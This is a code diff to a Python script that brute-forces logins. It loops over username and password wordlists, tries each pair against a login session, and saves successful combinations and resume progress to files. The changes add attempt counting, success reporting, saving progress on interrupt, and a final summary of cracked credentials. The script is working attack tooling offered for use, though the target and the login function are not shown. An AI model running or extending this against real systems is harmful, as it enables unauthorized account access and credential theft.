@@ -34,8 +34,8 @@ def run_brute_force() -> None:
 
     known_success = load_file(SUCCESS_FILE_PATH, as_set=True)
     progress_list = load_file(PROGRESS_FILE_PATH)
-    last_combo: Optional[str] = progress_list[-1] if progress_list else None
-    resume: bool = last_combo is None
+    last_saved_combo: Optional[str] = progress_list[-1] if progress_list else None
+    resume: bool = last_saved_combo is None
 
     usernames = load_file(USERNAMES_FILE_PATH)
     passwords = load_file(PASSWORDS_FILE_PATH)
@@ -44,6 +44,8 @@ def run_brute_force() -> None:
         return
 
     combo: Optional[str] = None
+    previous_tested_combo: Optional[str] = None
+    attempt_counter = 0
     try:
         for username in usernames:
             for password in passwords:
@@ -53,13 +55,14 @@ def run_brute_force() -> None:
                     continue
 
                 if not resume:
-                    if combo == last_combo:
+                    if combo == last_saved_combo:
                         resume = True
                     continue
 
-                print(f"[*] Attempting: {combo}")
-                try_login(session, known_success, username, password)
+                success, attempt_counter = try_login(session, known_success, username, password, attempt_counter)
                 save_to_file(PROGRESS_FILE_PATH, combo, overwrite=True)
+                print(f"[*] Tried: {combo} {'- Success!' if success else ''}")
+                previous_tested_combo = combo
 
     except (KeyboardInterrupt, Exception) as e:
         if isinstance(e, KeyboardInterrupt):
@@ -69,9 +72,15 @@ def run_brute_force() -> None:
                 f"\n[!] An unexpected error occurred: {e}. Saving progress and exiting."
             )
         if combo:
-            save_to_file(PROGRESS_FILE_PATH, combo, overwrite=True)
+            save_to_file(PROGRESS_FILE_PATH, previous_tested_combo, overwrite=True)
+            print(f"[*] Progress saved in {PROGRESS_FILE_PATH}.")
+            print(f"[*] Total successful combinations: {len(known_success)}")
         raise SystemExit(1)
-
+    
+    print("[*] Brute-force attack completed.")
+    print(f"[*] Total successful combinations: {len(known_success)}")
+    if known_success:
+        print(f"[*] Successful combinations saved in {SUCCESS_FILE_PATH}.")
 
 if __name__ == "__main__":
     run_brute_force()
